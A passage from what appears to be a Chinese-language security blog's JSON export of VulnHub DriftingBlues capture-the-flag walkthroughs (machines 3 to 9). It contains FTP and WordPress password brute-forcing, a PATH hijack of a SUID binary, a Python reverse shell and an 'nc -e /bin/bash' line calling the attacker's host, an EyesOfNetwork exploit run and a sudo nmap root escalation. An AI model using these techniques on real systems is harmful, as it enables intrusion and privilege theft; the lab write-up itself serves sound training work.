class=\"line\">robertj@driftingblues:&#x2F;tmp$ find &#x2F; -group operators -perm &#x2F;4000 2&gt;&#x2F;dev&#x2F;null</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;getinfo</span><br></pre></td></tr></table></figure>\n<p>运行该命令，发现得到的是一些服务器的信息</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">robertj@driftingblues:&#x2F;tmp$ getinfo</span><br><span class=\"line\">###################</span><br><span class=\"line\">ip address</span><br><span class=\"line\">###################</span><br><span class=\"line\"></span><br><span class=\"line\">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class=\"line\">    link&#x2F;loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class=\"line\">    inet 127.0.0.1&#x2F;8 scope host lo</span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">    inet6 ::1&#x2F;128 scope host</span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000</span><br><span class=\"line\">    link&#x2F;ether 08:00:27:d6:e5:24 brd ff:ff:ff:ff:ff:ff</span><br><span class=\"line\">    inet 192.168.56.110&#x2F;24 brd 192.168.56.255 scope global dynamic enp0s3</span><br><span class=\"line\">       valid_lft 561sec preferred_lft 561sec</span><br><span class=\"line\"></span><br><span class=\"line\">bash</span><br><span class=\"line\">    inet6 fe80::a00:27ff:fed6:e524&#x2F;64 scope link</span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">###################</span><br><span class=\"line\">hosts</span><br><span class=\"line\">###################</span><br><span class=\"line\"></span><br><span class=\"line\">127.0.0.1       localhost</span><br><span class=\"line\">127.0.1.1       driftingblues</span><br><span class=\"line\"></span><br><span class=\"line\">bash</span><br><span class=\"line\"></span><br><span class=\"line\"># The following lines are desirable for IPv6 capable hosts</span><br><span class=\"line\">::1     localhost ip6-localhost ip6-loopback</span><br><span class=\"line\">ff02::1 ip6-allnodes</span><br><span class=\"line\">ff02::2 ip6-allrouters</span><br><span class=\"line\">###################</span><br><span class=\"line\">os info</span><br><span class=\"line\">###################</span><br><span class=\"line\"></span><br><span class=\"line\">Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure>\n<p>应该是调用了一些linux命令然后输出，查看最后一行可以猜测是运行了uname命令，尝试查看改文件也能够看出一些蛛丝马迹</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ip address</span><br><span class=\"line\">###################</span><br><span class=\"line\">ip a###################</span><br><span class=\"line\">hosts</span><br><span class=\"line\">###################</span><br><span class=\"line\">cat &#x2F;etc&#x2F;hosts###################</span><br><span class=\"line\">os info</span><br><span class=\"line\">\u0003##################</span><br><span class=\"line\"> uname -a\u0001\u00038\u0006\\�������������T�����</span><br></pre></td></tr></table></figure>\n<p>知道其实是调用了uname命令的话，那么我们可以通过覆盖系统命令路径到我们自己编写命令那么就可以实现提权，在/tmp目录下新建uname文件：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">bash</span><br></pre></td></tr></table></figure>\n<p>然后修改path变量</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">export PATH&#x3D;&#x2F;tmp:$PATH</span><br></pre></td></tr></table></figure>\n<p>然后执行getinfo即可实现提权</p>\n<p>之前在监控进程时发现一个upit程序，查看计划任务</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@driftingblues:~# crontab -l</span><br><span class=\"line\"># For more information see the manual pages of crontab(5) and cron(8)</span><br><span class=\"line\">#</span><br><span class=\"line\"># m h  dom mon dow   command</span><br><span class=\"line\">SHELL&#x3D;&#x2F;bin&#x2F;sh</span><br><span class=\"line\">* * * * * bash &#x2F;root&#x2F;upit</span><br></pre></td></tr></table></figure>\n<p>可以看到果然存在一个upit的计划任务</p>\n<p>将getinfo文件进行反编译查看一下内容</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  setuid(0);</span><br><span class=\"line\">  puts(&quot;###################\\nip address\\n###################\\n&quot;);</span><br><span class=\"line\">  system(&quot;ip a&quot;);</span><br><span class=\"line\">  puts(&quot;###################\\nhosts\\n###################\\n&quot;);</span><br><span class=\"line\">  system(&quot;cat &#x2F;etc&#x2F;hosts&quot;);</span><br><span class=\"line\">  puts(&quot;###################\\nos info\\n###################\\n&quot;);</span><br><span class=\"line\">  system(&quot;uname -a&quot;);</span><br><span class=\"line\">  return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>完结撒花~</p>\n<p><a href=\"https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/\" target=\"_blank\" rel=\"noopener\">https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></p>\n","categories":["vulnhub"],"tags":["suid提权"]},{"title":"Vulnhub系列-Driftingblues4","url":"/2021/06/12/vulnhubDriftingblues4/","content":"<p><img src=\"/2021/06/12/vulnhubDriftingblues4/1.jpeg\" alt></p>\n<a id=\"more\"></a>\n<h1 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">nmap -p- -sT -sV -A -oA nmap -vv 192.168.56.111</span><br></pre></td></tr></table></figure>\n<p>开放端口为21,22，80端口</p>\n<p><strong>21</strong>端口</p>\n<p>21端口尝试匿名登录没什么收获</p>\n<p><strong>80端口</strong></p>\n<p>查看源代码，可以看到一段base64密文，该密文多层base64加密，最终解密之后如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">go back intruder!!! </span><br><span class=\"line\">tight security drippin </span><br><span class=\"line\">i hope you&#39;re an employee</span><br><span class=\"line\">&#x2F;imfuckingmad.txt</span><br></pre></td></tr></table></figure>\n<p>访问/imfuckingmad.txt页面，是一段brainfuck编码的字符，解码一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">man we are a tech company and still getting hacked??? what the shit??? enough is enough!!! </span><br><span class=\"line\">#</span><br><span class=\"line\">##</span><br><span class=\"line\">...</span><br><span class=\"line\">#</span><br><span class=\"line\">&#x2F;iTiS3Cr3TbiTCh.png</span><br></pre></td></tr></table></figure>\n<p>访问该图片发现是一个二维码，指向一个网址，是一张图片</p>\n<p><img src=\"/2021/06/12/vulnhubDriftingblues4/1.png\" alt></p>\n<p>给了一些用户名，收集信息发现ssh只支持公钥登录，那么就只能在ftp上使用了，所以我们进行密码爆破</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hydra -l luther -P &#x2F;opt&#x2F;SecLists&#x2F;Passwords&#x2F;Common-Credentials&#x2F;common-passwords-win.txt 192.168.56.111 ftp</span><br></pre></td></tr></table></figure>\n<p>但是爆破失败，无奈动用更大字典</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hydra -L user.txt -P &#x2F;opt&#x2F;SecLists&#x2F;Passwords&#x2F;Common-Credentials&#x2F;best1050.txt 192.168.56.111 ftp</span><br></pre></td></tr></table></figure>\n<p>终于成功！</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[21][ftp] host: 192.168.56.111   login: hubert   password: john316</span><br></pre></td></tr></table></figure>\n<p>使用此账号登录ftp</p>\n<p>登录之后啥也没有，只是有一个hubert的空目录，猜测该目录即为hubert用户的家目录，所以我们可以向该目录上传一个公钥从而使用公钥远程ssh登录</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">ftp&gt;</span><span class=\"bash\"> <span class=\"built_in\">cd</span> hubert</span></span><br><span class=\"line\">250 CWD command successful</span><br><span class=\"line\"><span class=\"meta\">ftp&gt;</span><span class=\"bash\"> mkdir .ssh</span></span><br><span class=\"line\"><span class=\"meta\">ftp&gt;</span><span class=\"bash\"> put authorized_keys</span></span><br></pre></td></tr></table></figure>\n<p>然后ssh登录，可以看到第一段flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hubert@driftingblues:~$ id</span><br><span class=\"line\">uid&#x3D;1001(hubert) gid&#x3D;1001(hubert) groups&#x3D;1001(hubert)</span><br><span class=\"line\">hubert@driftingblues:~$ ls</span><br><span class=\"line\">emergency.py  user.txt</span><br><span class=\"line\">hubert@driftingblues:~$ cat user.txt</span><br><span class=\"line\">flag 1&#x2F;2</span><br></pre></td></tr></table></figure>\n<h1 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h1><p>查看家目录下的文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hubert@driftingblues:~$ ls -al</span><br><span class=\"line\">total 32</span><br><span class=\"line\">drwx------ 4 hubert hubert 4096 Jun  7 10:09 .</span><br><span class=\"line\">drwxr-xr-x 4 root   root   4096 Jan  9 13:44 ..</span><br><span class=\"line\">-rwx------ 1 hubert hubert    1 Jun  7 10:09 .bash_history</span><br><span class=\"line\">-rwx------ 1 hubert hubert    1 Jun  7 10:09 .bashrc</span><br><span class=\"line\">-rwxr-xr-x 1 root   root    217 Jan  9 13:43 emergency.py</span><br><span class=\"line\">drwx------ 3 hubert hubert 4096 Jun  7 10:05 .gnupg</span><br><span class=\"line\">drwx------ 2 hubert hubert 4096 Jun  7 10:05 .ssh</span><br><span class=\"line\">-rwx------ 1 hubert hubert 1805 Jan  3 11:56 user.txt</span><br></pre></td></tr></table></figure>\n<p>可以看到存在一个emergency.py的属于root的文件，应该可以用来提权，文件内容如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\">os.system(<span class=\"string\">'echo 1 &gt;&gt; /tmp/backdoor_testing'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># template python script for backdoor purposes</span></span><br><span class=\"line\"><span class=\"comment\"># i'm gonna leave it with loose permissions</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># say africa without a's</span></span><br></pre></td></tr></table></figure>\n<p>进行进程监控发现该python文件会被定时执行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">2021&#x2F;06&#x2F;07 10:14:01 CMD: UID&#x3D;0    PID&#x3D;4826   | python &#x2F;home&#x2F;hubert&#x2F;emergency.py</span><br></pre></td></tr></table></figure>\n<p>之前我看到755以为不能删除文件，但是其实是可以删除的，那么就简单了，我们删除改文件然后在新建一个同名的反弹shell的python代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> subprocess</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class=\"line\">s.connect((<span class=\"string\">\"192.168.56.108\"</span>,<span class=\"number\">8080</span>))</span><br><span class=\"line\">os.dup2(s.fileno(),<span class=\"number\">0</span>)</span><br><span class=\"line\">os.dup2(s.fileno(),<span class=\"number\">1</span>)</span><br><span class=\"line\">os.dup2(s.fileno(),<span class=\"number\">2</span>)</span><br><span class=\"line\">p=subprocess.call([<span class=\"string\">\"/bin/sh\"</span>,<span class=\"string\">\"-i\"</span>]);</span><br></pre></td></tr></table></figure>\n<p>也可以通过nc命令提权</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">nc -e &#x2F;bin&#x2F;bash 192.168.56.108 8080</span><br></pre></td></tr></table></figure>\n<p>然后再kali上监听端口即可getshell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(kali㉿kali)-[~]</span><br><span class=\"line\">└─$ nc -lvvp 8080                                                                                                   1 ⨯</span><br><span class=\"line\">listening on [any] 8080 ...</span><br><span class=\"line\">192.168.56.111: inverse host lookup failed: Host name lookup failure</span><br><span class=\"line\">connect to [192.168.56.108] from (UNKNOWN) [192.168.56.111] 34826</span><br><span class=\"line\">&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off</span><br><span class=\"line\"># id</span><br><span class=\"line\">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class=\"line\"># ls &#x2F;root</span><br><span class=\"line\">root.txt</span><br><span class=\"line\">sync</span><br><span class=\"line\"># cat &#x2F;root&#x2F;root.txt</span><br><span class=\"line\">flag 2&#x2F;2</span><br></pre></td></tr></table></figure>\n","categories":["vulnhub"],"tags":["bruteForce"]},{"title":"Vulnhub系列-Driftingblues5","url":"/2021/06/13/vulnhubDriftingblues5/","content":"<p><img src=\"/2021/06/13/vulnhubDriftingblues5/1.jpg\" alt></p>\n<a id=\"more\"></a>\n<h1 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">nmap -sT -sV -p- -vv -A -oA namp 192.168.56.112</span><br></pre></td></tr></table></figure>\n<p>80和22端口开放，80端口跑的似乎是wordpress服务</p>\n<h1 id=\"80端口\"><a href=\"#80端口\" class=\"headerlink\" title=\"80端口\"></a>80端口</h1><p>尝试登录后台发现在登录的时候用户名和密码的错误提示不同，我们可以利用这个特性来进行爆破，网站有很多评论，提取出这个回复的用户名去网站后台进行登录测试，可以得到可用账号</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">collins</span><br><span class=\"line\">gill</span><br><span class=\"line\">satanic</span><br><span class=\"line\">gadd</span><br></pre></td></tr></table></figure>\n<p>使用此密码进行爆破</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">wpscan --url 192.168.56.112&#x2F; --usernames usernames --passwords &#x2F;opt&#x2F;SecLists&#x2F;Passwords&#x2F;Common-Credentials&#x2F;10k-most-common.txt</span><br></pre></td></tr></table></figure>\n<p>结果没有爆破出来，试了其它也没有什么思路，感觉还是这个作为突破点，使用cewl生成字典再次进行爆破</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cewl http:&#x2F;&#x2F;192.168.56.112&#x2F; -w password.txt</span><br><span class=\"line\">wpscan --url 192.168.56.112&#x2F; --usernames usernames --passwords password.txt</span><br></pre></td></tr></table></figure>\n<p>爆破得到密码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">gill &#x2F; interchangeable</span><br></pre></td></tr></table></figure>\n<p>登录网站之后找图片，在media中发现有一张图片是unattached状态，将该图片下载下来使用strings命令可以看到ssh的密码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">gill:59583hello</span><br></pre></td></tr></table></figure>\n<p>使用ssh登录，登录之后在家目录下有一个keepass文档，将该文件转换为哈希文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">keepass2john &#x2F;tmp&#x2F;keyfile.kdbx &gt; keepass.txt</span><br></pre></td></tr></table></figure>\n<p>接下来就是爆破密码了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hashcat -m 13400 -a 0 -w 1 keepass.txt  &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>\n<p>对应的密码为<code>porsiempre</code>，这是keepass的master密码，用keepass工具带入keyfile文件</p>\n<p><img src=\"/2021/06/13/vulnhubDriftingblues5/1.png\" alt></p>\n<p>使用pspy进行进程监控，可以看到会运行一个定时任务</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">2021&#x2F;06&#x2F;12 10:15:01 CMD: UID&#x3D;0    PID&#x3D;3896   | &#x2F;bin&#x2F;sh -c &#x2F;root&#x2F;key.sh</span><br></pre></td></tr></table></figure>\n<p>这个文件没有权限可以修改，在根目录下有个keyfolder文件夹，我们将keepass解出来的标题对应的文件名写入该文件夹下，一个一个试，如果文件名正确，等一分钟左右就会在文件夹下多出一个文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">-rw-r--r--  1 gill gill    5 Jun 12 11:12 fracturedocean</span><br><span class=\"line\">-rw-r--r--  1 root root   29 Jun 12 11:16 rootcreds.txt</span><br></pre></td></tr></table></figure>\n<p>查看该文件即可获取密码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">gill@driftingblues:~# cat &#x2F;keyfolder&#x2F;rootcreds.txt</span><br><span class=\"line\">root creds</span><br><span class=\"line\"></span><br><span class=\"line\">imjustdrifting31</span><br></pre></td></tr></table></figure>\n<p>登录即可获取flag2</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@driftingblues:~# cat root.txt</span><br><span class=\"line\">flag 2&#x2F;2</span><br></pre></td></tr></table></figure>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>总体来说，这个靶机感觉很需要脑洞，一堆字典爆破。</p>\n","categories":["vulnhub"],"tags":["bruteForce"]},{"title":"Vulnhub系列-Driftingblues7","url":"/2021/06/20/vulnhubDriftingblues7/","content":"<p><img src=\"/2021/06/20/vulnhubDriftingblues7/3.jpg\" alt></p>\n<a id=\"more\"></a>\n<p><strong>端口扫描</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">nmap -sT -sV -p- -vv -A -oA nmap 192.168.56.113</span><br></pre></td></tr></table></figure>\n<p>开放了多个端口</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Discovered open port 3306&#x2F;tcp on 192.168.56.113</span><br><span class=\"line\">Discovered open port 111&#x2F;tcp on 192.168.56.113</span><br><span class=\"line\">Discovered open port 443&#x2F;tcp on 192.168.56.113</span><br><span class=\"line\">Discovered open port 22&#x2F;tcp on 192.168.56.113</span><br><span class=\"line\">Discovered open port 80&#x2F;tcp on 192.168.56.113</span><br><span class=\"line\">Discovered open port 2403&#x2F;tcp on 192.168.56.113</span><br><span class=\"line\">Discovered open port 8086&#x2F;tcp on 192.168.56.113</span><br><span class=\"line\">Discovered open port 66&#x2F;tcp on 192.168.56.113</span><br></pre></td></tr></table></figure>\n<p>经过测试66端口的服务没什么利用价值，所以寻找其他服务</p>\n<p><strong>3306端口</strong></p>\n<p>3306端口无法远程连接</p>\n<p><strong>66端口</strong></p>\n<p>一个http服务，但是没有找到什么有价值的内容，尝试一下目录扫描</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">gobuster dir -u http:&#x2F;&#x2F;192.168.56.113:66&#x2F; -x php,txt,html -t 40 -w &#x2F;opt&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;directory-list-2.3-medium.txt --no-error</span><br></pre></td></tr></table></figure>\n<p>结果如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;flag.txt             (Status: 200) [Size: 1823]</span><br><span class=\"line\">&#x2F;index_files          (Status: 301) [Size: 0] [--&gt; &#x2F;index_files&#x2F;]</span><br></pre></td></tr></table></figure>\n<p>访问flag.txt可以看到flag，但是应该是个假flag</p>\n<p><strong>80端口</strong></p>\n<p>进行一下目录扫描</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">gobuster dir -u https:&#x2F;&#x2F;192.168.56.113&#x2F; -k -x php,txt,html -t 40 -w &#x2F;opt&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;directory-list-2.3-medium.txt -b 302,404,301,500</span><br></pre></td></tr></table></figure>\n<p>没有扫到什么有效的目录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;login.php</span><br><span class=\"line\">&#x2F;header.php</span><br><span class=\"line\">&#x2F;logout.php</span><br></pre></td></tr></table></figure>\n<p>发现80端口部署了eyes of works，搜索相应的漏洞</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(kali㉿kali)-[~&#x2F;Desktop&#x2F;driftingblues7]</span><br><span class=\"line\">└─$ searchsploit eyes of network</span><br><span class=\"line\">-------------------------------------------------------------------------------------- ---------------------------------</span><br><span class=\"line\"> Exploit Title                                                                        |  Path</span><br><span class=\"line\">-------------------------------------------------------------------------------------- ---------------------------------</span><br><span class=\"line\">EyesOfNetwork (EON) 5.0 - Remote Code Execution                                       | php&#x2F;webapps&#x2F;41746.md</span><br><span class=\"line\">EyesOfNetwork (EON) 5.0 - SQL Injection                                               | php&#x2F;webapps&#x2F;41747.md</span><br><span class=\"line\">EyesOfNetwork (EON) 5.1 - SQL Injection                                               | php&#x2F;webapps&#x2F;41774.py</span><br><span class=\"line\">EyesOfNetwork - AutoDiscovery Target Command Execution (Metasploit)                   | multiple&#x2F;remote&#x2F;48169.rb</span><br><span class=\"line\">EyesOfNetwork 5.1 - Authenticated Remote Command Execution                            | php&#x2F;webapps&#x2F;47280.py</span><br><span class=\"line\">EyesOfNetwork 5.3 - File Upload Remote Code Execution                                 | multiple&#x2F;webapps&#x2F;49432.sh</span><br><span class=\"line\">EyesOfNetwork 5.3 - LFI                                                               | multiple&#x2F;webapps&#x2F;49404.txt</span><br><span class=\"line\">EyesOfNetwork 5.3 - RCE &amp; PrivEsc                                                     | multiple&#x2F;webapps&#x2F;49402.txt</span><br><span class=\"line\">EyesOfNetwork 5.3 - Remote Code Execution                                             | php&#x2F;webapps&#x2F;48025.txt</span><br><span class=\"line\">-------------------------------------------------------------------------------------- ---------------------------------</span><br><span class=\"line\">Shellcodes: No Results</span><br></pre></td></tr></table></figure>\n<p>使用48025.txt可以创建出新的管理员用户：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;48025.txt https:&#x2F;&#x2F;192.168.56.113 -ip 127.0.0.1 -port 8888 -user snow</span><br></pre></td></tr></table></figure>\n<p>用户名和密码如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">snow:net_was_here</span><br></pre></td></tr></table></figure>\n<p>使用该超级管理员账号登录，然后访问autodiscovery.php文件可以通过nmap进行getshell</p>\n<p><img src=\"/2021/06/20/vulnhubDriftingblues7/1.png\" alt></p>\n<p>在本地监听8888端口，然后执行该扫描即可得到反弹的shell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(kali㉿kali)-[~&#x2F;Desktop&#x2F;driftingblues7]</span><br><span class=\"line\">└─$ nc -lvvp 8888</span><br><span class=\"line\">listening on [any] 8888 ...</span><br><span class=\"line\">192.168.56.113: inverse host lookup failed: Unknown host</span><br><span class=\"line\">connect to [192.168.56.108] from (UNKNOWN) [192.168.56.113] 38132</span><br><span class=\"line\">ls</span><br><span class=\"line\">autodiscover.php</span><br><span class=\"line\">classes.inc.php</span><br><span class=\"line\">engines</span><br><span class=\"line\">whoami</span><br><span class=\"line\">apache</span><br></pre></td></tr></table></figure>\n<p>此时是apache用户，该用户可以在不使用密码的情况下通过sudo执行nmap命令从而提权</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">echo &#39;os.execute(&quot;&#x2F;bin&#x2F;sh&quot;)&#39; &gt; &#x2F;tmp&#x2F;nmap.script</span><br><span class=\"line\">sudo nmap --script&#x3D;&#x2F;tmp&#x2F;nmap.script</span><br></pre></td></tr></table></figure>\n<p>此时即可获得root权限</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">id</span><br><span class=\"line\">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class=\"line\">cd &#x2F;root</span><br><span class=\"line\">ls</span><br><span class=\"line\">anaconda-ks.cfg</span><br><span class=\"line\">eon</span><br><span class=\"line\">flag.txt</span><br><span class=\"line\">index.htm</span><br><span class=\"line\">index_files</span><br><span class=\"line\">logdel2</span><br><span class=\"line\">upit.sh</span><br><span class=\"line\">cat flag.txt</span><br><span class=\"line\">flag 1&#x2F;1</span><br></pre></td></tr></table></figure>\n<p>登录之后查看sudoers文件可以看到与我们所想一致</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># eonweb</span><br><span class=\"line\">apache ALL&#x3D;NOPASSWD:&#x2F;bin&#x2F;systemctl * snmptt,&#x2F;bin&#x2F;systemctl * snmptrapd,&#x2F;bin&#x2F;systemctl * snmpd,&#x2F;bin&#x2F;systemctl * nagios,&#x2F;bin&#x2F;systemctl * gedd,&#x2F;usr&#x2F;bin&#x2F;nmap</span><br></pre></td></tr></table></figure>\n<p><strong>111端口</strong></p>\n<p>开启的是一个rpcbind服务，暂没找到利用思路</p>\n<p><strong>443</strong></p>\n<p>https服务，80端口会跳转到该https网站</p>\n<p><strong>2403</strong></p>\n<p>部署的是一个taskmaster服务</p>\n<p><strong>8086</strong></p>\n<p>部署的是一个InfluxDB http admin服务</p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>要加强公开CVE的利用能力</p>\n","categories":["vulnhub"],"tags":["cve"]},{"title":"Vulnhub系列-Driftingblues9","url":"/2021/07/18/vulnhubDriftingblues9/","content":"<p><img src=\"/2021/07/18/vulnhubDriftingblues9/1.jpg\" alt></p>\n<a id=\"more\"></a>\n<p>nmap进行端口扫描</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">nmap -p- -sT -sV -A -oA nmap -vv 192.168.56.114</span><br></pre></td></tr></table></figure>\n<p>发现开放了80，111，60711三个端口，对80端口进行爆破，爆破发现目录INSTALL.txt，访问该文件可以知道网站运行的cms和版本号</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;</span><br><span class=\"line\">&#x2F;&#x2F; </span><br><span class=\"line\">&#x2F;&#x2F; Advanced Power of PHP</span><br><span class=\"line\">&#x2F;&#x2F; ---------------------</span><br><span class=\"line\">&#x2F;&#x2F; http:&#x2F;&#x2F;www.apphp.com</span><br><span class=\"line\">&#x2F;&#x2F; </span><br><span class=\"line\">&#x2F;&#x2F; ApPHP MicroBlog Free</span><br><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">&#x2F;&#x2F; Version: 1.0.1</span><br><span class=\"line\">&#x2F;&#x2F;</span><br><span 